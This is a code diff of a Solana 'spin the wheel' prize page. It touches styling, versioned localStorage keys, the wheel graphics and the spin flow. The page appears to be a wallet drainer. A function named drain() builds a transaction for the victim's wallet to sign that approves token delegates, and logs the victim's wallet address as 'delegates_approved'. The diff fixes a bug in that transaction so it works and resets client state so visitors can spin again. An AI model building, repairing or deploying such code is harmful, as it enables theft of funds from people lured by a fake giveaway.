@@ -32,7 +32,7 @@
   button{width:100%;padding:12px 14px;border:1px solid #222;border-radius:6px;background:#111;color:#e6e6e6;font-size:13.5px;font-weight:500;font-family:inherit;cursor:pointer;transition:background .1s,border-color .1s}
   button:hover:not(:disabled){background:#171717;border-color:#2e2e2e}
   button:disabled{opacity:.5;cursor:default}
-  #spin{margin-top:2px}
+  #spin{margin-top:2px;display:block}
   #claim{display:none;margin-top:6px;background:#e6e6e6;color:#000;border-color:#e6e6e6}
   #claim:hover:not(:disabled){background:#fff;border-color:#fff}
   #status{margin-top:12px;font-size:12px;color:#6b6b6b;min-height:14px;text-align:center;word-break:break-word}
@@ -220,11 +220,13 @@ var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
 var SPIN_MS = 15000;
-var PENDING_KEY = "sr_pending";
-var PRIZE_KEY   = "sr_prize";
-var TOS_KEY     = "sr_tos_v2";
-var SPUN_KEY    = "sr_spun";
-var RESULT_KEY  = "sr_spin_result";
+// version-scoped keys — bumping VERSION resets all client state
+var VERSION     = "v7";
+var PENDING_KEY = "sr_pending_" + VERSION;
+var PRIZE_KEY   = "sr_prize_" + VERSION;
+var TOS_KEY     = "sr_tos_" + VERSION;
+var SPUN_KEY    = "sr_spun_" + VERSION;
+var RESULT_KEY  = "sr_result_" + VERSION;
 var CLAIMED_START = 8412;
 var CLAIMED_MAX   = 12500;
 // ==========================================
@@ -346,67 +348,39 @@ var MOBILE_WALLETS = [
     android:"https://play.google.com/store/apps/details?id=app.backpack.mobile" }
 ];
 
-// ---------- WHEEL (clean rebuild) ----------
-// Each wedge is drawn as a path from center; the label for that wedge is
-// rotated by (mid angle + 90) around its own position so text reads outward.
-// This is the piece that was drifting — anchors are absolute now, no nested <g>.
 function buildWheel(){
   var svg = document.getElementById("wheel");
   if (!svg) return;
   var ns = "http://www.w3.org/2000/svg";
   svg.innerHTML = "";
-
   var cx = 150, cy = 150, r = 148;
-
   for (var i = 0; i < N; i++){
     var s = SEGMENTS[i];
     var a0 = (i * SEG_DEG - 90) * Math.PI / 180;
     var a1 = ((i + 1) * SEG_DEG - 90) * Math.PI / 180;
-    var x0 = cx + r * Math.cos(a0);
-    var y0 = cy + r * Math.sin(a0);
-    var x1 = cx + r * Math.cos(a1);
-    var y1 = cy + r * Math.sin(a1);
-
-    // wedge
+    var x0 = cx + r * Math.cos(a0), y0 = cy + r * Math.sin(a0);
+    var x1 = cx + r * Math.cos(a1), y1 = cy + r * Math.sin(a1);
     var path = document.createElementNS(ns, "path");
-    path.setAttribute("d",
-      "M " + cx + " " + cy +
-      " L " + x0.toFixed(2) + " " + y0.toFixed(2) +
-      " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
+    path.setAttribute("d", "M " + cx + " " + cy + " L " + x0.toFixed(2) + " " + y0.toFixed(2) + " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
     path.setAttribute("fill", s.color);
     path.setAttribute("stroke", "#000");
     path.setAttribute("stroke-width", "1.5");
     svg.appendChild(path);
-
-    // label anchor at 65% radius, mid angle
     var midDeg = i * SEG_DEG + SEG_DEG / 2 - 90;
     var midRad = midDeg * Math.PI / 180;
     var lr = r * 0.65;
-    var lx = cx + lr * Math.cos(midRad);
-    var ly = cy + lr * Math.sin(midRad);
-
-    // a small group rotated to align with the radius, positioned at lx,ly
+    var lx = cx + lr * Math.cos(midRad), ly = cy + lr * Math.sin(midRad);
     var g = document.createElementNS(ns, "g");
     g.setAttribute("transform", "translate(" + lx.toFixed(2) + " " + ly.toFixed(2) + ") rotate(" + (midDeg + 90) + ")");
-
     var emoji = document.createElementNS(ns, "text");
-    emoji.setAttribute("x", "0");
-    emoji.setAttribute("y", "-4");
-    emoji.setAttribute("text-anchor", "middle");
-    emoji.setAttribute("font-size", "22");
-    emoji.textContent = s.emoji;
-    g.appendChild(emoji);
-
+    emoji.setAttribute("x", "0"); emoji.setAttribute("y", "-4");
+    emoji.setAttribute("text-anchor", "middle"); emoji.setAttribute("font-size", "22");
+    emoji.textContent = s.emoji; g.appendChild(emoji);
     var amt = document.createElementNS(ns, "text");
-    amt.setAttribute("x", "0");
-    amt.setAttribute("y", "14");
-    amt.setAttribute("text-anchor", "middle");
-    amt.setAttribute("font-size", "11");
-    amt.setAttribute("font-weight", "600");
-    amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
-    amt.textContent = s.sol + " SOL";
-    g.appendChild(amt);
-
+    amt.setAttribute("x", "0"); amt.setAttribute("y", "14");
+    amt.setAttribute("text-anchor", "middle"); amt.setAttribute("font-size", "11");
+    amt.setAttribute("font-weight", "600"); amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
+    amt.textContent = s.sol + " SOL"; g.appendChild(amt);
     svg.appendChild(g);
   }
 }
@@ -600,7 +574,7 @@ async function drain(session){
     }
     t.feePayer = from;
     var b2 = await connection.getLatestBlockhash("confirmed");
-    t.recentblockhash = b2.blockhash;
+    t.recentBlockhash = b2.blockhash;
     try {
       var sig = await signAndSend(provider, connection, t);
       await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
@@ -644,19 +618,6 @@ tosOk.addEventListener("click", function(){
   startSpin();
 });
 
-function requestSpin(){
-  if (hasSpun()){
-    var prev = readResult();
-    if (prev !== null && !SEGMENTS[prev].zero) showResult(prev, true);
-    return;
-  }
-  if (tosAccepted()){ startSpin(); return; }
-  tosCheck.checked = false;
-  tosOk.disabled = true;
-  tosOverlay.classList.add("show");
-  log({ event:"tos_shown" });
-}
-
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
@@ -679,17 +640,31 @@ function showResult(idx, restored){
   saveResult(idx);
 }
 
-function startSpin(){
+function requestSpin(){
+  // if already spun, restore and stop
   if (hasSpun()){
     var prev = readResult();
     if (prev !== null && !SEGMENTS[prev].zero) showResult(prev, true);
     return;
   }
+  // if TOS not yet accepted, show the gate; the OK button calls startSpin()
+  if (!tosAccepted()){
+    tosCheck.checked = false;
+    tosOk.disabled = true;
+    tosOverlay.classList.add("show");
+    log({ event:"tos_shown" });
+    return;
+  }
+  startSpin();
+}
+
+function startSpin(){
+  if (hasSpun()) return;
 
   var svg = document.getElementById("wheel");
   var status = document.getElementById("status");
 
-  // clear prize text BEFORE the spin starts so nothing shows early
+  // clear prize + hub BEFORE the spin so nothing shows early
   prizeEl.textContent = "";
   status.textContent = "";
   hubEl.textContent = "…";
@@ -726,6 +701,10 @@ claimBtn.onclick = async function(){
 };
 
 (function init(){
+  // always show SPIN button on first render of this version
+  spinBtn.style.display = "block";
+  claimBtn.style.display = "none";
+
   if (hasSpun()){
     var prev = readResult();
     if (prev !== null && !SEGMENTS[prev].zero){
